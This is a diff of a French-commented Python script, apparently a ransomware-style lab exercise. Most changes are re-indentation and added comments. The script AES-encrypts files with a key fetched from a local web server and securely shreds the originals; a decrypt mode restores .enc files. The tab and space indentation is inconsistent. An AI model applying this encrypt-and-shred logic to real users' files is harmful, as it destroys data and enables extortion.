@@ -13,7 +13,7 @@ def encryptFile(key, filename, chunksize=24*1024):
     key : clé utilisé pour le chiffrement de taille 32 bits
     filename : le fichier qu'on souhaite chiffrer
     chunksize : taille de bloc que la fonction va lire, ici on prend des morceaux de 24 octets,
-                ce système permet de chiffrer des fichiers volumineux sans saturer la RAM. 
+    ce système permet de chiffrer des fichiers volumineux sans saturer la RAM. 
     '''
     
     #On créer le fichier de sortie chiffré
@@ -31,16 +31,16 @@ def encryptFile(key, filename, chunksize=24*1024):
             #On setup la fonction de chiffement avec la clé, le mode et le vecteur d'initialisation
             encryptor = AES.new(key, AES.MODE_CBC, iv)
 		
-	    #on écrit sur les 8 premiers octets du fichier chiffré la taille du fichier original (en little endian) (nécessaire pour déchiffrer)
+	        #on écrit sur les 8 premiers octets du fichier chiffré la taille du fichier original (en little endian) (nécessaire pour déchiffrer)
             outfile.write(struct.pack('<Q', filesize))
 		
-	    #on écrit l'iv de chiffrement ensuite sur les 16 octets d'après (nécessaire pour le déchiffrement)
+	        #on écrit l'iv de chiffrement ensuite sur les 16 octets d'après (nécessaire pour le déchiffrement)
             outfile.write(iv)
 		
 	    '''si la taille du chunk vaut 0 c'est qu'on est arrivé à la fin du fichier, 
-            dans le cas où le dernier la taille du dernier chunk n'est pas divisible par 16 (taille de l'iv) on rajoute la différence avec des espaces.
-            on écrit ensuite le chunk chiffré dans le fichier.
-            '''
+        dans le cas où le dernier la taille du dernier chunk n'est pas divisible par 16 (taille de l'iv) on rajoute la différence avec des espaces.
+        on écrit ensuite le chunk chiffré dans le fichier.
+        '''
 	    while True:
                 chunk = infile.read(chunksize)
                 if len(chunk) == 0:
@@ -60,12 +60,20 @@ def decryptFile(key, filename, chunksize=24*1024):
     chunksize : taille de bloc que la fonction va lire, ici 24 octets
     '''
     out_filename = filename[:-4]
-
+    
+    #on ouvre en lecture le fichier chiffré
     with open(filename, 'rb') as infile:
+        #on récupère la taille du fichier originale
         origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
+        #on récupère l'iv
         iv = infile.read(16)
+        #on setup la fonction de déchiffrement
         decryptor = AES.new(key, AES.MODE_CBC, iv)
-
+        
+        '''on ouvre le fichier de sortie en écriture, si la taille du chunk vaut 0 c'est qu'on a fini. 
+        On écrit le chunk déchiffré sur le fichier.
+        On retire les derniers octets du fichiers pour supprimer les espaces mis lors du chiffrement.
+        '''
         with open(out_filename, 'wb') as outfile:
             while True:
                 chunk = infile.read(chunksize)
@@ -98,21 +106,21 @@ def main(argv):
                 if file[-4:] == ".enc":
                     decryptFile(key, file)
 		
-	            #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
+	                #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
                     subprocess.check_output(["shred", "-uz", file])
 
             # chiffrement
             else:
                 if file[-4:] != ".enc": 
 			
-		    #faire une requête get au serveur web pour récupérer la clé
-    		    url = 'http://localhost:8888/key.txt'
-    		    resp = requests.get(url)
-    		    key= resp.text
+		            #faire une requête get au serveur web pour récupérer la clé
+    		        url = 'http://localhost:8888/key.txt'
+    		        resp = requests.get(url)
+    		        key= resp.text
     	     	    key= key.rstrip("\n")
-    		    key= key.encode('utf-8')
+    		        key= key.encode('utf-8')
 			
-		    #chiffrement
+		            #chiffrement
                     encryptFile(key, file)
 			
                     #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers d'origine
